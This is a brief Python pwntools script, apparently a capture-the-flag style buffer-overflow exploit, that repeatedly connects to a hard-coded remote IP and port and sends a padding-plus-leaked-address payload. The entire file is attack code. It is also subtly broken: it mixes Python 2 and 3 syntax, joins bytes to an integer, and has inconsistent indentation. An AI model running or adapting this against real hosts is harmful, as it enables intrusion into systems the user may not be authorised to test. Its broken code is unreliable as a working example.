#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
buffer = 'A' * 100

while True:
    try:
        # Connect to the remote service
        p = remote('170.64.222.246', 1343)
        p.recvuntil(b"Your buffer is located at: ")
        buffer_addr = p.recvline().strip()
        buffer_addr = int(buffer_addr, 16)  # Convert address from string to integer
        
        print '[*] Sending buffer with length: ', str(len(buffer))
        
        padding = b"A" * 512  # Adjust padding based on your target's buffer size
        payload = padding + buffer_addr
        
        p.sendlineafter(b'> ', payload)
        leaked_data = p.recvall()
        print(leaked_data)

    except Exception as e:
          print '[*] Crash occurred at buffer length: ' + str(len(buffer)-100)
        print(f"An error occurred: {e}")